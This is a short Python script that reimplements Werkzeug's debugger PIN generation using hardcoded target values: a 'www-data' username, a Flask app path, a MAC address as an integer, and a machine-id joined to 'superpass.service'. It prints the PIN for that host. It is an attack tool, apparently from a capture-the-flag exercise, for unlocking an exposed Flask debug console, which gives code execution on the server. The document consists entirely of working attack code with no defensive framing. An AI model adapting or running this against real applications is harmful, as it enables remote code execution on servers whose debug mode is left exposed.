#! /usr/bin/python

import hashlib
import typing as t
import sys
from itertools import chain

def get_pin_and_cookie_name():

    num = None
    rv = None

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        "www-data",
        "flask.app",
        "wsgi_app",
        "/app/venv/lib/python3.10/site-packages/flask/app.py",
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(345052402113), b"" + b"ed5b159560f54721827644bc9b220d00" + b"superpass.service"]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")



    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    print(rv)
    return rv


def main():
    """Main function"""
    get_pin_and_cookie_name()

if __name__ == '__main__':
    main()